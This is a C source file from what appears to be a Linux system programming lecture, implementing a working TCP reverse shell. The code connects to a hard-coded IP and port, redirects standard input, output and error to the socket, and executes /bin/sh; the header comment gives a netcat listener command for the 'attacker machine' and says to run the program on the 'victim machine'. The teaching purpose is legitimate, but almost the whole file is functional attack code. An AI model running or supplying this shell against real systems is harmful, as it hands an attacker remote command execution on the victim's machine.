/*
*  Video Lecture: 39
*  Instructor: Arif Butt
*  Course: System Programming with Linux
*  C_shell_reverse__tcp.c: The porgram connects to ip/port
*  and on successful connection redirect the std descriptor
*  and finally do an exec
*  Compile: gcc C_shell_reverse_tcp.c -o C_shell_reverse__tcp
*  Run a listner process on kali linux (attacker machine)
*  $ nc -l 192.168.100.20 -p 54154 -v
*  Run this program on ubuntu server (victim machine)
*  # ./C_shell_reverse_tcp
*/
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h> 
#include <stdlib.h> 
#include <unistd.h>
#include <string.h>
int main(int argc, char** argv){
//*** STEP-I:  Create a socket
   int sockfd = socket(PF_INET, SOCK_STREAM, 0);
//*** STEP-II: Populate Socket's DS for remote IP and Port, and
//***          let the local IP and Port be selected by the OS itself
   struct sockaddr_in dest_addr;
   dest_addr.sin_family = AF_INET;    
   dest_addr.sin_port = htons(54154);
   inet_aton("192.168.100.21", &dest_addr.sin_addr);
   memset(&(dest_addr.sin_zero), '\0', sizeof dest_addr.sin_zero); 
//*** STEP-III: Connect this socket to the server's socket
   connect(sockfd, (struct sockaddr*)& dest_addr, sizeof dest_addr);
//*** STEP-IV: Simply redirect stdin, stdout and stderr to the socket descriptor
for(int i = 0; i <= 2; i++)
		dup2(sockfd, i);

//*** STEP-V: Overwrite current process with shell and enjoy
	execve( "/bin/sh", NULL, NULL );
   exit(0);
}

